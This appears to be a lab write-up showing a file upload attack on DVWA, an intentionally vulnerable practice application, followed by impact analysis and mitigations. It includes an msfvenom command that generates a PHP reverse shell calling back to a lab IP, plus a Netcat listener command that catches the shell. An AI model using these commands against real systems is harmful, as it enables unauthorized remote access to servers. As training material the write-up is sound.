# File Upload Vulnerability Writeup

## Overview
File Upload vulnerabilities occur when an application allows files to be uploaded without properly validating their type, size, or content. This can allow attackers to upload malicious scripts, leading to remote code execution or data exfiltration.

---

## **Steps Taken**

### 1. Identifying the Vulnerability
- Navigated to the File Upload module in DVWA.
- Observed that the module allowed uploading of files without any apparent validation.

### 2. Creating a Malicious Payload
Used `msfvenom` to create a PHP reverse shell payload:
```bash
msfvenom -p php/reverse_php LHOST=192.168.191.128 LPORT=4444 -f raw > shell.php
```
- The payload connects back to the attacker's machine, providing a reverse shell for remote access.

- ![Reverse-Shell-Payload-Generation](https://github.com/user-attachments/assets/99a7095e-a219-4e31-b58a-c550e0450b30)
  <p align="center">Reverse Shell Payload Generation</p>

### 3. Uploading the Payload
- Uploaded `shell.php` via the File Upload module.
- Confirmed successful upload by accessing the upload directory:
  ```
  http://127.0.0.1/hackable/uploads/shell.php
  ```
- ![Uploaded-shell.php](https://github.com/user-attachments/assets/a4fb12d1-b7f7-43eb-ac8b-bd0b0c2763f9)
  <p align="center">Uploaded shell</p>

### 4. Establishing a Reverse Shell
- Started a Netcat listener to capture the reverse shell connection:
  ```bash
  nc -lvnp 4444
  ```
- Triggered the malicious script by visiting its URL.
- Successfully gained a reverse shell as the `www-data` user.

- ![Successful-Reverse-Shell Connection](https://github.com/user-attachments/assets/d0aceb73-a5aa-4e4e-9a06-4206a25fc80f)

  <p align="center">Successful Reverse Shell Connection</p>

---

## **Analysis**
- **Impact:**
  - An attacker can upload malicious scripts, enabling remote code execution.
  - Potential compromise of the web server and access to sensitive files.
  - Possibility of further exploitation through privilege escalation.

- **Exploitability:**
  - Exploiting file upload vulnerabilities is straightforward if there is no file validation.

---

## **Mitigation Strategies**
1. **File Type Validation:**
   - Restrict allowed file types to only those necessary (e.g., `.jpg`, `.png`).
   - Validate file MIME types on the server side.

2. **Content Scanning:**
   - Scan uploaded files for malicious content using antivirus or sandboxing tools.

3. **Rename Files:**
   - Rename uploaded files to prevent execution (e.g., append a `.txt` extension).

4. **Restrict Execution:**
   - Configure the upload directory to prevent execution of scripts.

5. **Use Secure Libraries:**
   - Use libraries or frameworks that provide secure file upload handling.

---

